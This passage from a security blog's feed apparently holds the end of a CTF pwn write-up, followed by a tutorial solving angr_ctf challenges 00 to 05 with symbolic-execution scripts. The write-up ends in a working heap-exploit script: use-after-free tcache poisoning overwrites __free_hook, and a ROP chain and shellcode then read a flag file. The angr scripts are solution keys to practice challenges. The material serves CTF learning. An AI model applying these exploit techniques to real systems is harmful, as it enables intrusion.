add(<span class="number">12</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="number">0x60</span>)   <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3b0</span> / <span class="number">0x30</span> + <span class="number">1</span>):</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment"># fake chunk: 13 11 12</span></span><br><span class="line">    echo(<span class="string">&#x27;HACX SIG:&#x27;</span> + <span class="built_in">hex</span>(heap + <span class="number">0xf50</span>))</span><br><span class="line">    paylaod = <span class="built_in">str</span>(frame)</span><br><span class="line">    edit(<span class="number">11</span>, paylaod[<span class="number">0</span>:<span class="number">0x60</span>])</span><br><span class="line">    edit(<span class="number">12</span>, paylaod[<span class="number">0x60</span>:<span class="number">0x60</span> + <span class="number">0x50</span>])</span><br><span class="line">    edit(<span class="number">13</span>, paylaod[<span class="number">0x60</span> + <span class="number">0x50</span>:].ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># poc()</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(free_hook) + p64(heap))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">14</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">14</span>, p64(setcontext_door))   <span class="comment"># __free_hook</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    layout = [</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">    free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line">    <span class="number">0x2000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: jmp rsp;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub rsp, 0x800</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    cmp eax, 0</span></span><br><span class="line"><span class="string">    js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    failed:</span></span><br><span class="line"><span class="string">    push 0x6c696166</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 4</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    exit:</span></span><br><span class="line"><span class="string">    xor edi, edi</span></span><br><span class="line"><span class="string">    mov eax, 231</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    sl(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></p><p>å¤ªèœäº†ï¼Œè¦å¥½å¥½å­¦ä¹ </p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
            <tag> sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡angr-ctfå­¦ä¹ angrç¬¦å·æ‰§è¡Œ</title>
      <link href="2021/09/10/angr-ctf/"/>
      <url>2021/09/10/angr-ctf/</url>
      
        <content type="html"><![CDATA[<p>angr_ctf: <a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a><br>angr: <a href="https://angr.io/">https://angr.io/</a></p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>Step</p><pre><code>1. Create an angr project. 2. Create an entry to start execution. 3. Create a simulation manager initialized with the starting state. 4. Explore the binary. 5. Find the input.</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  <span class="comment"># Create an Angr project.</span></span><br><span class="line">  <span class="comment"># If you want to be able to point to the binary from the command line, you can</span></span><br><span class="line">  <span class="comment"># use argv[1] as the parameter. Then, you can run the script from the command</span></span><br><span class="line">  <span class="comment"># line as follows:</span></span><br><span class="line">  <span class="comment"># python ./scaffold00.py [binary]</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># m:string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Tell Angr where to start executing (should it start from the main()</span></span><br><span class="line">  <span class="comment"># function or somewhere else?) For now, use the entry_state function</span></span><br><span class="line">  <span class="comment"># to instruct Angr to start from the main() function.</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create a simulation manager initialized with the starting state. It provides</span></span><br><span class="line">  <span class="comment"># a number of useful tools to search and execute the binary.</span></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Explore the binary to attempt to find the address that prints &quot;Good Job.&quot;</span></span><br><span class="line">  <span class="comment"># You will have to find the address you want to find and insert it here. </span></span><br><span class="line">  <span class="comment"># This function will keep executing until it either finds a solution or it </span></span><br><span class="line">  <span class="comment"># has explored every possible path through the executable.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  print_good_address = ???  # :integer (probably in hexadecimal)</span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Check that we have found a solution. The simulation.explore() method will</span></span><br><span class="line">  <span class="comment"># set simulation.found to a list of the states that it could find that reach</span></span><br><span class="line">  <span class="comment"># the instruction we asked it to search for. Remember, in Python, if a list</span></span><br><span class="line">  <span class="comment"># is empty, it will be evaluated as false, otherwise true.</span></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="comment"># The explore method stops after it finds a single state that arrives at the</span></span><br><span class="line">    <span class="comment"># target address.</span></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Print the string that Angr wrote to stdin to follow solution_state. This </span></span><br><span class="line">    <span class="comment"># is our solution.</span></span><br><span class="line">    <span class="built_in">print</span> solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># If Angr could not find a path that reaches print_good_address, throw an</span></span><br><span class="line">    <span class="comment"># error. Perhaps you mistyped the print_good_address?</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The problem solving script:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line"></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  target_addr = <span class="number">0x08048678</span></span><br><span class="line">  simulation.explore(find=target_addr)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Cound&#x27;t find it!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><blockquote><p>Tick stash â€œstashâ€ forward (up to â€œnâ€ times or until â€œnum_findâ€ states are found), looking for condition â€œfindâ€, avoiding condition â€œavoidâ€. Stores found states into â€œfind_stashâ€™ and avoided states into â€œavoid_stashâ€.</p><p>The â€œfindâ€ and â€œavoidâ€ parameters may be any of:</p><ul><li>An address to find</li><li>A set or list of addresses to find</li><li>A function that takes a state and returns whether or not it matches.</li></ul><p>If an angr CFG is passed in as the â€œcfgâ€ parameter and â€œfindâ€ is either a number or a list or a set, then any states which cannot possibly reach a success state without going through a failure state will be preemptively avoided.</p></blockquote><p>The â€œavoidâ€ argument will not store the found state. This will help us save the time.</p><p>When I fixed the problem, IDA suggested that the function was too large.</p><p>When I solved this challenge and used ida to decompile, IDA showed that the function was too big.</p><p>Solution: change the config file.</p><p>MacOS: IDA_HOME/idabin/cfg/hexrays.cfg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MAX_FUNCSIZE            = <span class="number">64</span>        <span class="comment">// Functions over 64K are not decompiled</span></span><br></pre></td></tr></table></figure><p>Change that to the following:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MAX_FUNCSIZE            = <span class="number">1024</span>        <span class="comment">// Functions over 1024K are not decompiled</span></span><br></pre></td></tr></table></figure><p>Although we fixed the configuration file, this function is too big and we will spend too much time decompiling it. So we can read the assembly code directly. </p><p><img src="https://i.loli.net/2021/09/10/eMunHzcQvViNpyt.png" alt="01-1.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  <span class="comment"># Explore the binary, but this time, instead of only looking for a state that</span></span><br><span class="line">  <span class="comment"># reaches the print_good_address, also find a state that does not reach </span></span><br><span class="line">  <span class="comment"># will_not_succeed_address. The binary is pretty large, to save you some time,</span></span><br><span class="line">  <span class="comment"># everything you will need to look at is near the beginning of the address </span></span><br><span class="line">  <span class="comment"># space.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  binary_path = argv[<span class="number">1</span>]</span><br><span class="line">  proj = angr.Project(binary_path, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  initial_state = proj.factory.entry_state()</span><br><span class="line">  simulation = proj.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  target_address = <span class="number">0x80485E0</span></span><br><span class="line">  avoid_address = [<span class="number">0x080485A8</span>, <span class="number">0x080485F2</span>]</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=target_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Don&#x27;t find the target.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><blockquote><p>It is very useful to be able to search <em>for</em> a state that reaches a certain</p><p>instruction. However, <em>in</em> some cases, you may not know the address of the</p><p>specific instruction you want to reach (<em>or</em> perhaps there <em>is</em> no single</p><p>instruction goal.) In this challenge, you donâ€™t know which instruction</p><p>grants you success. Instead, you just know that you want to find a state where</p><p>the binary prints â€œGood Job.â€</p><p>Angr is powerful in that it allows you to search <em>for</em> a states that meets an</p><p>arbitrary condition that you specify <em>in</em> Python, using a predicate you define</p><p><em>as</em> a function that takes a state and returns True <em>if</em> you have found what you</p><p>are looking <em>for</em>, and False otherwise.</p></blockquote><p>Although we can find the address of the target instruction, in order to train the writing of angr, we use the recommended method of the script, which is to find the conditions we hope to achieve by writing functions.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line">  </span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Can&#x27;t find it.&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>Through this challenge we can learn how to control registers and manually set entries through angr.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Angr doesn&#x27;t currently support reading multiple things with scanf (Ex: </span></span><br><span class="line"><span class="comment"># scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the</span></span><br><span class="line"><span class="comment"># program after scanf is called and manually inject the symbols into registers.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sometimes, you want to specify where the program should start. The variable</span></span><br><span class="line">  <span class="comment"># start_address will specify where the symbolic execution engine should begin.</span></span><br><span class="line">  <span class="comment"># Note that we are using blank_state, not entry_state.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  start_address = <span class="number">0x8048980</span>  <span class="comment"># :integer (probably hexadecimal)</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create a symbolic bitvector (the datatype Angr uses to inject symbolic</span></span><br><span class="line">  <span class="comment"># values into the binary.) The first parameter is just a name Angr uses</span></span><br><span class="line">  <span class="comment"># to reference it. </span></span><br><span class="line">  <span class="comment"># You will have to construct multiple bitvectors. Copy the two lines below</span></span><br><span class="line">  <span class="comment"># and change the variable names. To figure out how many (and of what size)</span></span><br><span class="line">  <span class="comment"># you need, dissassemble the binary and determine the format parameter passed</span></span><br><span class="line">  <span class="comment"># to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password_size_in_bits = <span class="number">20</span> * <span class="number">8</span>  <span class="comment"># :integer</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, password_size_in_bits)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, password_size_in_bits)</span><br><span class="line">  password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, password_size_in_bits)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Set a register to a symbolic value. This is one way to inject symbols into</span></span><br><span class="line">  <span class="comment"># the program.</span></span><br><span class="line">  <span class="comment"># initial_state.regs stores a number of convenient attributes that reference</span></span><br><span class="line">  <span class="comment"># registers by name. For example, to set eax to password0, use:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># initial_state.regs.eax = password0</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># You will have to set multiple registers to distinct bitvectors. Copy and</span></span><br><span class="line">  <span class="comment"># paste the line below and change the register. To determine which registers</span></span><br><span class="line">  <span class="comment"># to inject which symbol, dissassemble the binary and look at the instructions</span></span><br><span class="line">  <span class="comment"># immediately following the call to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.regs.eax = password0</span><br><span class="line">  initial_state.regs.ebx = password1</span><br><span class="line">  initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for the symbolic values. If there are multiple solutions, we only</span></span><br><span class="line">    <span class="comment"># care about one, so we can use eval, which returns any (but only one)</span></span><br><span class="line">    <span class="comment"># solution. Pass eval the bitvector you want to solve for.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Aggregate and format the solutions you computed above, and then print</span></span><br><span class="line">    <span class="comment"># the full string. Pay attention to the order of the integers, and the</span></span><br><span class="line">    <span class="comment"># expected base (decimal, octal, hexadecimal, etc).</span></span><br><span class="line">    <span class="comment"># solution = solution0 + &quot; &quot; + solution1 + &quot; &quot; + solution2  # :string</span></span><br><span class="line">    print(<span class="string">&quot;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(solution0, solution1, solution2))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keywords: simulation.found[0].solver.eval(), initial_state.regs.register</p><h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>This challenge exercises our ability to construct stacks using angr.</p><p>Tips:</p><blockquote><p> Since we are starting after scanf, we are skipping this stack construction step. To make up for this, we need to construct the stack ourselves. Let us start by initializing ebp in the exact same way the program does.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge will be more challenging than the previous challenges that you</span></span><br><span class="line"><span class="comment"># have encountered thus far. Since the goal of this CTF is to teach symbolic</span></span><br><span class="line"><span class="comment"># execution and not how to construct stack frames, these comments will work you</span></span><br><span class="line"><span class="comment"># through understanding what is on the stack.</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"><span class="comment"># IMPORTANT: Any addresses in this script aren&#x27;t necessarily right! Dissassemble</span></span><br><span class="line"><span class="comment">#            the binary yourself to determine the correct addresses!</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048697</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  initial_state.regs.ebp = initial_state.regs.esp</span><br><span class="line">  print(initial_state.regs.ebp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  padding_length_in_bytes = <span class="number">8</span>   <span class="comment"># :integer</span></span><br><span class="line">  initial_state.regs.esp -= padding_length_in_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  initial_state.stack_push(password0)  <span class="comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></span><br><span class="line">  initial_state.stack_push(password1)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    ...</span><br><span class="line">    print(solution0, solution1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>padding_length_in_bytes = 8</code></p><p>Note that the value of padding in the above script is calculated by stack.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048679                 push    ebp</span><br><span class="line">.text:0804867A                 mov     ebp, esp</span><br><span class="line">.text:0804867C                 sub     esp, 18h</span><br></pre></td></tr></table></figure><p>In ida, the stack memory for this function is 0x18 bytes.</p><p>â€œv1â€ is located at the position of â€œebp - 0x10â€ and the â€œv2â€ is located at the position of â€œebp - 0xcâ€.  So when the address is indexed by ESP, the offset is 0x18-0x10, which is exactly the position of the first parameter.</p><p>keywords: initial_state.stack_push()</p><h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><blockquote><p>  Determine the address of the global variable to which scanf writes the user input. The function â€˜initial_state.memory.store(address, value)â€™ will write â€˜valueâ€™ (a bitvector) to â€˜addressâ€™ (a memory location, <em>as</em> an integer.) The â€˜addressâ€™ parameter can also be a bitvector (<em>and</em> can be symbolic!).</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048601</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># The binary is calling scanf(&quot;%8s %8s %8s %8s&quot;).</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  password0_address = <span class="number">0xA1BA1C0</span></span><br><span class="line">  password1_address = <span class="number">0xA1BA1C8</span></span><br><span class="line">  password2_address = <span 